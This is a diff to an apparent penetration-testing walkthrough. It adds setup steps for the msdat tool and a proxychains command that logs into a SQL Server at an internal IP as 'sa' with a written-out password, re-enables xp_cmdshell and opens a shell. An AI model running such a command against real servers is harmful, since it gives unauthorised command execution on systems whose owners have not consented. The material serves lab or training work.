@@ -170,10 +170,35 @@ cd /usr/share && git clone https://github.com/quentinhardy/msdat.git
 
 <br/>
 
+Use `virtualenv` to run:
+
+```
+cd /usr/share/msdat
+virtualenv --python=/usr/bin/python2 .
+```
+
+<br/>
+
 Install the dependencies:
 
 ```
-sudo apt-get install freetds-dev 
-sudo pip install cython colorlog termcolor pymssql argparse
-sudo pip install argcomplete && sudo activate-global-python-argcomplete
+sudo apt install freetds-dev -y
+pip install cython colorlog termcolor pymssql argparse
+pip install argcomplete && sudo activate-global-python-argcomplete
 ```
+
+<br/>
+
+Use `msdat.py` to obtain a xpcmdshell:<br/>
+(*Note: This weird command comes from the msdat.dit Github page; it is in fact re-enabling xpcmdshell.*)
+```
+proxychains python msdat.py xpcmdshell -s 10.1.3.2 -p 1433 -U sa -P 'SAAdmin!@#$%' --enable-xpcmdshell --disable-xpcmdshell --disable-xpcmdshell --shell
+```
+
+![picture 39](images/ddb862a847c7fe90d012306fc3f21f054553d714446573653a4b9527c339a4f6.png)  
+  
+
+<br/>
+
+
+
